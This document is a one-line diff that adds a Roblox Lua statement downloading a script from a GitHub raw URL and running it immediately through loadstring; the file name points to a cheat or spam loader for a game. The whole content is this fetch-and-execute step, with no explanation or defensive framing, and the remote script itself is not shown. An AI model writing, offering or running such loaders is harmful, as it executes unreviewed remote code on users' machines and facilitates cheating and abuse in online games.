@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/1-stone-skipping-spam7-h5yj0tfeo5sst6.lua"))()
